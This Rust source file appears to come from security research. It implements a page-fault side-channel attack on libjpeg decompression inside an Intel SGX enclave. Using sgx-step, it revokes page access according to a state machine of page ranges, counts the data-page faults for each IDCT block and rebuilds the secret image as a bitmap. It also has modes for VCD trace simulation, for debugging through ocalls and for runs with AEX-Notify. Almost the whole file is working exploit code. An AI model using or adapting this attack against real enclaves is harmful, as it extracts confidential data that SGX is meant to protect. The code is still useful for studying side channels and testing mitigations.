use bmp::{Image, Pixel};
use clap::{Parser, Subcommand};
use indicatif::{ProgressBar, ProgressStyle};
use once_cell::sync::OnceCell;
use std::{
    collections::{HashMap, VecDeque},
    error::Error,
    ffi::{c_char, c_int, CString},
    fmt::{Display, Formatter},
    fs::File,
    io::BufReader,
    ops::Range,
    ptr::null_mut,
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Mutex,
    },
};

static PROGRESS_BAR: OnceCell<ProgressBar> = OnceCell::new();

#[derive(Debug, Clone, Copy)]
pub enum AttackError {
    // TODO: add different errors
    Unknown,
    Mprotect,
}

impl Display for AttackError {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            AttackError::Unknown => f.write_str("unknown error"),
            AttackError::Mprotect => f.write_str("failed to protect memory"),
        }
    }
}

impl Error for AttackError {}

pub struct JpegColor(usize);
pub const JPEG_GRAY: JpegColor = JpegColor(0);
pub const JPEG_RED: JpegColor = JpegColor(0);
pub const JPEG_GREEN: JpegColor = JpegColor(1);
pub const JPEG_BLUE: JpegColor = JpegColor(2);

/// Struct used for JPEG image reconstruction from page fault traces.
///
/// Reconstruction happens when repeatedly calling the reconstruct
/// function on each `JpegState` transition.
#[derive(Clone, Debug)]
pub struct JpegReconstruct {
    current_color: usize,
    num_colors: usize,
    reconstructed_buffer: Vec<Vec<Vec<usize>>>,
    max_data: usize,
    min_data: usize,
    current_row: usize,
    pub scale: f64,
    pub offset: f64,
}

impl JpegReconstruct {
    pub fn new(num_colors: usize) -> Self {
        let mut buffer = vec![Vec::with_capacity(1000); num_colors];
        for v in &mut buffer {
            v.push(vec![]);
        }

        Self {
            max_data: 1,
            min_data: usize::MAX,
            current_color: 0,
            num_colors,
            current_row: 0,
            reconstructed_buffer: buffer,
            scale: -0.08,
            offset: 20.,
        }
    }

    pub fn reconstructed_pixel(&self, color: usize, x: usize, y: usize) -> isize {
        *self.reconstructed_buffer[color % self.num_colors][y]
            .get(x)
            .unwrap_or(&0) as isize
    }

    pub fn reconstructed_size(&self) -> [usize; 2] {
        [
            self.reconstructed_buffer[0]
                .iter()
                .map(|v| v.len())
                .max()
                .unwrap_or(0),
            self.reconstructed_buffer[0].len() - 1,
        ]
    }

    /// Creates a bitmap `Image` with the reconstruction
    pub fn reconstructed_bitmap(&self) -> Image {
        let [width, height] = self.reconstructed_size();
        let mut image = Image::new(width as u32, height as u32);

        // Calculate values to normalize the image colors
        let mut buffer = self.reconstruction(JPEG_GRAY);
        buffer.sort();
        let median = buffer[buffer.len() / 2];
        let min = self.min_data as isize;
        println!("min: {}, median: {}, max: {}", min, median, self.max_data);
        let scale = 255. / ((self.max_data as isize - min) as f64);

        for x in 0..width {
            for y in 0..height {
                // Apply normalization
                let pixel = Pixel::new(
                    (((self.reconstructed_pixel(JPEG_RED.0, x, y) - min) as f64).max(0.) * scale)
                        as u8,
                    (((self.reconstructed_pixel(JPEG_GREEN.0, x, y) - min) as f64).max(0.) * scale)
                        as u8,
                    (((self.reconstructed_pixel(JPEG_BLUE.0, x, y) - min) as f64).max(0.) * scale)
                        as u8,
                );
                // Set bitmap pixel
                image.set_pixel(x as u32, y as u32, pixel);
            }
        }

        image
    }

    /// Returns the reconstruction buffer
    pub fn reconstruction(&self, color: JpegColor) -> Vec<usize> {
        self.reconstructed_buffer[color.0]
            .iter()
            .cloned()
            .flatten()
            .collect()
    }

    pub fn raw_reconstruction(&self) -> &Vec<Vec<Vec<usize>>> {
        &self.reconstructed_buffer
    }

    /// Advance to the next row in the reconstruction.
    pub fn next_row(&mut self) {
        for i in 0..self.num_colors {
            self.reconstructed_buffer[i].push(Vec::with_capacity(300));
        }
        self.current_row += 1;
    }

    /// Reconstruct a JPEG block based on the given number of data accesses that were counted
    /// during reconstruction of this block.
    pub fn reconstruct_block(&mut self, num_data: usize) {
        // Also update the min and max data count values encountered,
        // which will be used to normalize the reconstructed image.
        self.max_data = self.max_data.max(num_data);
        self.min_data = self.min_data.min(num_data);
        self.reconstructed_buffer[self.current_color][self.current_row as usize].push(num_data);
        self.current_color = (self.current_color + 1) % self.num_colors;
        PROGRESS_BAR.get().unwrap().inc(1);
    }

    /// Called to notify `JpegReconstruct` of a state transition
    pub fn reconstruct(&mut self, prev_state: JpegState, new_state: JpegState) {
        // If we were previously in a data counting state, but we no longer are,
        // reconstruct another block based on the number of data accesses counted.
        if let JpegState::DataCount(data_count) = prev_state {
            if !matches!(new_state, JpegState::DataCount(_)) {
                self.reconstruct_block(data_count);
            }
        }

        // If we transition from `JpegState::NextRow` to `JpegState::StartRow`,
        // notify the reconstruction that we moved to the next row.
        if prev_state == JpegState::NextRow && new_state == JpegState::StartRow {
            self.next_row();
        }
    }
}

/// State machine used for the libjpeg attack.
///
/// Every state corresponds to a range of pages that when encountered
/// can trigger a state transition to this state, if the transition is allowed.
#[derive(Debug, Clone, Default, Copy, PartialEq, Eq)]
pub enum JpegState {
    #[default]
    PreStart,
    Start,
    NextRow,
    StartRow,
    PreIdctSlow,
    StartIdctSlow,
    IdctSlow,
    DataCount(usize),
}

impl JpegState {
    /// Defines the ranges of pages for each state
    pub fn pages(self, has_aexnotify: bool) -> Range<usize> {
        match self {
            Self::PreStart => 0..0,
            Self::Start => 54..55,
            Self::NextRow => 44..46,
            Self::StartRow => 58..59,
            Self::PreIdctSlow => 59..60,
            Self::IdctSlow => 63..65,
            // Self::DataCount(_) => 150..4340,
            // Self::DataCount(_) => 188..190,
            // Self::DataCount(_) => 156..167,
            // Self::DataCount(_) => 150..190,
            Self::DataCount(_) => {
                if has_aexnotify {
                    150..4335
                } else {
                    150..4340
                }
            }

            // Self::PreStart => 0..0,
            // Self::Start => 38..39,
            // Self::NextRow => 39..42,
            // Self::StartRow => 30..31,
            // Self::PreIdctSlow => 23..24,
            // Self::IdctSlow => 26..28,
            // Self::DataCount(_) => 200..300,

            // Self::PreStart => 0..0,
            // Self::Start => 1132..1133,
            // Self::NextRow => 1154..1155,
            // Self::StartRow => 1167..1168,
            // Self::NextRow => 36..37,
            // Self::PreIdctSlow => 1142..1143,
            // Self::StartIdctSlow => 36..37,
            // Self::IdctSlow => 1149..1150,
            // Self::DataCount(_) => 200..234,
            // Self::DataCount(_) => 1200..5000,
            // Self::DataCount(_) => 200..4370,
            _ => 0..0, // Other states cannot be reached
        }
    }

    /// Defines the transitions between states
    pub fn next_states(self) -> Vec<Self> {
        match self {
            Self::PreStart => vec![Self::Start],
            Self::Start => vec![Self::StartRow],
            Self::NextRow => vec![Self::StartRow],
            Self::StartRow => vec![Self::IdctSlow],
            Self::PreIdctSlow => vec![Self::IdctSlow, Self::NextRow],
            Self::IdctSlow => vec![Self::DataCount(1)],
            Self::DataCount(x) => vec![Self::DataCount(x + 1), Self::PreIdctSlow, Self::NextRow],
            _ => vec![],
        }
    }

    /// Advance to the next state if we fault on the given page
    pub fn next(self, page: usize, has_aexnotify: bool) -> Self {
        self.next_states()
            .into_iter()
            .find(|state| state.pages(has_aexnotify).contains(&page))
            .unwrap_or(self)
    }

    /// Returns the list of pages that may trigger a state transition.
    ///
    /// In other words, the union of all ranges of pages for all potential
    /// next states reachable from the current state.
    ///
    /// This is used during the attack to determine which pages to revoke access to.
    pub fn next_pages(self, has_aexnotify: bool) -> Vec<Range<usize>> {
        self.next_states()
            .into_iter()
            .map(|state| state.pages(has_aexnotify))
            .collect()
    }
}

#[cfg(feature = "sgx")]
mod sgx {
    use super::*;
    use sgx_step::sgx_step_sys::{
        get_enclave_ssa_gprsgx_adrs, print_enclave_info, register_enclave_info,
        register_fault_handler, restore_pages, revoke_pages,
    };
    use sgx_urts_sys::{
        sgx_create_enclave, sgx_destroy_enclave, sgx_enclave_id_t, sgx_launch_token_t,
    };

    static GLOBAL_STATE: OnceCell<Mutex<GlobalState>> = OnceCell::new();

    /// Global state used when attacking an enclave.
    ///
    /// We use global state, since page faults are handled asynchronously.
    #[derive(Debug)]
    pub struct GlobalState {
        state: JpegState,
        reconstruct: JpegReconstruct,
        working_set: VecDeque<usize>,
        prev_page: usize,
        use_ocalls: bool,
        has_aexnotify: bool,
    }

    unsafe impl Sync for GlobalState {}
    unsafe impl Send for GlobalState {}

    impl GlobalState {
        pub fn new(color: bool) -> Self {
            Self {
                state: JpegState::PreStart,
                reconstruct: JpegReconstruct::new(if color { 3 } else { 1 }),
                working_set: VecDeque::new(),
                prev_page: 0,
                use_ocalls: false,
                has_aexnotify: false,
            }
        }

        /// Revoke access to pages from valid next states
        pub fn protect_next_pages(&mut self) -> Result<(), AttackError> {
            // For each state
            self.state
                .next_pages(self.has_aexnotify)
                .into_iter()
                .map(|pages| {
                    // Pages is the range of pages of one of the possible next states.
                    //
                    // We can revoke them using a single mprotect call,
                    // but the implementation is abstracted away in libsgxstep,
                    // and could be replaced with more clever PTE hacking.
                    let res = unsafe { revoke_pages(pages.start, pages.len()) };
                    if res != 0 {
                        Err(AttackError::Mprotect)
                    } else {
                        Ok(())
                    }
                })
                .collect::<Result<Vec<()>, AttackError>>()?;
            Ok(())
        }
    }

    /// Page fault handler
    extern "C" fn fault_handler(page: usize) {
        let mut global = GLOBAL_STATE.get().unwrap().lock().unwrap();

        // Transition to the next state
        let prev_state = global.state;
        let new_state = global.state.next(page, global.has_aexnotify);
        // if new_state != prev_state {
        //     if !matches!(new_state, JpegState::DataCount(_)) {
        //         println!("fault@{page}: {prev_state:?} -> {new_state:?}");
        //     } else {
        //         // println!("Data on page {page}");
        //     }
        // }

        // Notify the reconstruction of the state transition
        global.reconstruct.reconstruct(prev_state, new_state);
        global.state = new_state;

        // Revoke access to next pages to set up state transition triggers
        global.protect_next_pages().unwrap();

        if global.has_aexnotify {
            global.working_set.push_back(page);

            // Working set of size 2
            if global.working_set.len() > 2 {
                global.working_set.pop_front();
            }

            // println!("{:?}", global.working_set);

            for page in global.working_set.iter() {
                if unsafe { restore_pages(*page, 1) } != 0 {
                    panic!("Unable to mprotect");
                }
            }
        } else {
            // Restore access to the current page
            if unsafe { restore_pages(page, 1) } != 0 {
                panic!("Unable to mprotect");
            }
        }

        global.prev_page = page;
    }

    // See `libjpeg.c` for implementation of these function.
    //
    // They are wrappers around ecalls to the libjpeg enclave.
    extern "C" {
        fn load_image(
            eid: sgx_enclave_id_t,
            input: *const c_char,
            input_size: usize,
            output_size: usize,
        ) -> c_int;
        fn decompress_image(eid: sgx_enclave_id_t) -> c_int;
        fn free_image(eid: sgx_enclave_id_t) -> c_int;
    }

    #[no_mangle]
    pub extern "C" fn ocall_print_string(s: *mut c_char) {
        println!("{}", unsafe { CString::from_raw(s) }.into_string().unwrap());
    }

    #[no_mangle]
    pub extern "C" fn ocall_print_int(s: *mut c_char, i: c_int) {
        println!(
            "{}: {}",
            unsafe { CString::from_raw(s) }.into_string().unwrap(),
            i
        );
    }

    static ZERO_COUNT: AtomicUsize = AtomicUsize::new(0);
    static SKIP_FIRST: AtomicBool = AtomicBool::new(false);

    #[no_mangle]
    pub extern "C" fn ocall_next_row() {
        if !SKIP_FIRST.load(Ordering::Relaxed) {
            SKIP_FIRST.store(true, Ordering::Relaxed);
            return;
        }
        let mut global = GLOBAL_STATE.get().unwrap().lock().unwrap();
        if global.use_ocalls {
            global.reconstruct.next_row();
        }
    }

    #[no_mangle]
    pub extern "C" fn ocall_idct_islow() {
        let mut global = GLOBAL_STATE.get().unwrap().lock().unwrap();
        if global.use_ocalls {
            global
                .reconstruct
                .reconstruct_block(ZERO_COUNT.load(Ordering::Relaxed));
            ZERO_COUNT.store(0, Ordering::Relaxed);
        }
    }

    #[no_mangle]
    pub extern "C" fn ocall_all_zero() {
        ZERO_COUNT.fetch_add(1, Ordering::Relaxed);
    }

    pub fn attack_enclave(
        enclave: &str,
        args: &Args,
        input_size: u64,
        output_size: u64,
        use_fault_handler: bool,
    ) -> Result<(), Box<dyn Error>> {
        let mut token: sgx_launch_token_t = [0; 1024];
        let mut updated = 0;
        let mut eid: sgx_enclave_id_t = 0;
        Ok(unsafe {
            // Create the enclave
            let enclave_so = CString::new(enclave)?;
            println!(
                "Creating enclave... result: {:x}",
                sgx_create_enclave(
                    enclave_so.as_ptr(),
                    1,
                    &mut token,
                    &mut updated,
                    &mut eid,
                    null_mut(),
                )
            );

            println!("Created enclave with eid {eid}");

            register_enclave_info();
            print_enclave_info();

            // Initialize global state
            let mut data = GlobalState::new(args.color);
            dbg!(get_enclave_ssa_gprsgx_adrs());

            // Load the libjpeg image into the enclave
            let input = CString::new(args.image.as_str())?;
            assert!(
                load_image(
                    eid,
                    input.as_ptr(),
                    input_size as usize,
                    output_size as usize
                ) == 0
            );

            if use_fault_handler {
                // Register a page fault handler
                register_fault_handler(Some(fault_handler));
                data.protect_next_pages().unwrap();
            } else {
                data.use_ocalls = true;
            }
            data.has_aexnotify = args.aexnotify;

            GLOBAL_STATE.set(Mutex::new(data)).unwrap();

            // Call vulnerable decompression code
            assert!(decompress_image(eid) == 0);

            // Free the image
            assert!(free_image(eid) == 0);

            // Destroy the enclave
            sgx_destroy_enclave(eid);

            // Save the reconstructed image
            let data = GLOBAL_STATE.get().unwrap().lock().unwrap();
            args.raw_output.as_ref().map(|o| {
                std::fs::write(
                    o,
                    serde_json::to_string_pretty(data.reconstruct.raw_reconstruction()).unwrap(),
                )
            });
            let image = data.reconstruct.reconstructed_bitmap();
            args.output.as_ref().map(|o| image.save(o).unwrap());

            // print_enclave_info();
        })
    }
}

mod trace {
    use super::*;
    use vcd::{Command, IdCode};

    pub fn attack_vcd(vcd: &str, args: &Args) -> Result<(), Box<dyn Error>> {
        let mut reader = vcd::Parser::new(BufReader::new(File::open(vcd)?));
        let header = reader.parse_header()?;

        // Create a mapping between VCD id codes and page numbers
        let vars: HashMap<IdCode, u64> = (0..9999)
            .filter_map(|page| {
                header
                    .find_var(&["trace", &format!("_{}", page.to_string())])
                    .map(|p| (p.code, page))
            })
            .collect();

        // Initialize state and reconstruction
        let mut state = JpegState::PreStart;
        let mut reconstruct = JpegReconstruct::new(if args.color { 3 } else { 1 });

        // Iterate over all VCD commands and simulate the attack
        while let Some(command) = reader.next().transpose()? {
            match command {
                Command::ChangeScalar(i, v) => {
                    if v == vcd::Value::V1 {
                        if let Some(page) = vars.get(&i) {
                            let page = *page as usize;
                            // println!("access to page {page}");
                            let prev_state = state;
                            let new_state = state.next(page, args.aexnotify);
                            // if new_state != prev_state {
                            //     if !matches!(new_state, JpegState::DataCount(_)) {
                            //         println!("{prev_state:?} -> {new_state:?}");
                            //     } else {
                            //         println!("Data on page {page}");
                            //     }
                            // }
                            reconstruct.reconstruct(prev_state, new_state);
                            // if new_state != state {
                            //     println!("{state:?} -> {new_state:?}");
                            // }
                            state = new_state;
                        }
                    }
                }
                _ => {}
            }
        }

        // Save the reconstructed image
        args.raw_output.as_ref().map(|o| {
            std::fs::write(
                o,
                serde_json::to_string_pretty(reconstruct.raw_reconstruction()).unwrap(),
            )
        });
        let image = reconstruct.reconstructed_bitmap();
        args.output.as_ref().map(|o| image.save(o).unwrap());
        Ok(())
    }
}

/// Page fault attack on libjpeg
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
pub struct Args {
    /// Attack mode
    #[command(subcommand)]
    mode: Mode,

    /// Output bitmap file
    #[arg(short, long)]
    output: Option<String>,

    /// Output JSON file
    #[arg(short, long)]
    raw_output: Option<String>,

    /// Input image file
    #[arg(short, long)]
    image: String,

    #[arg(short, long)]
    color: bool,

    #[arg(short, long, default_value_t = false)]
    aexnotify: bool,
}

#[derive(Subcommand, Debug)]
pub enum Mode {
    /// Simulate attack with a VCD page access trace
    Trace {
        #[arg(short, long)]
        vcd: String,
    },
    #[cfg(feature = "sgx")]
    /// Attack on an enclave using page faults
    Enclave {
        #[arg(short, long)]
        enclave: String,
    },
    #[cfg(feature = "sgx")]
    /// Attack on an enclave using ocalls (for debugging)
    Ocalls {
        #[arg(short, long)]
        enclave: String,
    },
}

fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();

    // We need to know the dimensions of the image in order to make sure
    // the enclave has a sufficiently large buffer for the image.
    //
    // This information is NOT used by the attack.
    let (width, height) = image::image_dimensions(&args.image)?;
    let input_size = std::fs::metadata(&args.image)?.len();
    let output_size = ((width * height * 3) + 100) as u64;

    // Initialize the progress bar
    let mut num_blocks = ((width / 8) + 1) * ((height / 8) + 1);
    if args.color {
        num_blocks *= 3;
    }
    let progress_bar = ProgressBar::new(num_blocks as u64);
    progress_bar.set_style(
        ProgressStyle::with_template(
            "[{elapsed_precise}] {wide_bar} {pos:>7}/{len:7} ETA: [{eta_precise}] ",
        )
        .unwrap()
        .progress_chars("##-"),
    );
    PROGRESS_BAR.set(progress_bar).unwrap();

    match &args.mode {
        Mode::Trace { vcd } => trace::attack_vcd(vcd, &args)?,
        #[cfg(feature = "sgx")]
        Mode::Enclave { enclave } | Mode::Ocalls { enclave } => sgx::attack_enclave(
            enclave,
            &args,
            input_size,
            output_size,
            matches!(&args.mode, &Mode::Enclave { .. }),
        )?,
    };

    Ok(())
}
